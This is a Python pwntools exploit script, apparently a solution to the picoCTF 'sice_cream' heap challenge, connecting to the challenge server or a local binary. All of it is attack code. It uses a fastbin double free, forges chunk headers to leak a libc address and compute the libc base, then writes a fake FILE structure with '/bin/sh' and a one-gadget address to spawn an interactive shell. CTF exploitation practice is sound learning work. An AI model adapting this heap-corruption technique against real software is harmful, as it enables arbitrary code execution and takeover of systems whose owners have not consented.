from pwn import *
import sys

if args.REMOTE:
    io = remote("jupiter.challenges.picoctf.org", 51860)
else:
    io = process("./sice_cream", stderr=sys.stdout)

delim = b"> "

def create(size, data):
    io.sendlineafter(delim, b"1")
    io.sendlineafter(delim, str(size).encode())
    if len(data) < size:
        data += b"\n"
    io.sendafter(delim, data)

def delete(index):
    io.sendlineafter(delim, b"2")
    io.sendlineafter(delim, str(index).encode())

def change(data):
    io.sendlineafter(delim, b"3")
    if len(data) < 0x100:
        data += b"\n"
    io.sendafter(delim, data)

io.sendline()

create(0, b"") # 0
create(0, b"") # 1
create(0, b"") # 2

payload =  b""
payload += p64(0) + p64(0x21)
payload =  payload.ljust(0x100, b"\x00")
change(payload)

delete(0)
delete(1)
delete(0)

create(8, p64(0x602040)) # 3
create(0, b"")           # 4
create(0, b"")           # 5
create(0, b"")           # 6

payload =  b""
payload += p64(0) + p64(0x91)
payload += b"\x00" * 0x88
payload += p64(0x21)
payload += p64(0) * 3
payload += p64(0x21)
assert(len(payload) <= 256)
change(payload)

delete(6)

data = b"A" * 15
change(data)
io.recvuntil(b"A\n")
leak = io.recv(6)
leak = u64(leak + b"\x00\x00")
print(f"[+] leak: 0x{leak:x}")
base = leak - 0x3c4b78
print(f"[+] base: 0x{base:x}")

victim = base + 0x3c5520 - 0x10
print(f"[+] victim: 0x{victim:x}")

if args.SYSTEM:
    shell = base + 0x45390
else:
    shell = base + 0xf1147
print(f"[+] shell: 0x{shell:x}")

size = 0x60
payload =  b""
payload += b"/bin/sh\x00" + p64(size | 1)
payload += p64(leak) + p64(victim)
payload += p64(0) + p64(1)
payload =  list(payload.ljust(0x100, b"A"))
payload[0xc0:0xc8] = p64(0)
payload[0xd8:0xe0] = p64(0x602080)
payload[0x58:0x60] = p64(shell)
payload = bytes(payload)
assert(len(payload) <= 256)
change(payload)

io.sendlineafter(delim, b"1")
io.sendlineafter(delim, b"0")

io.interactive()
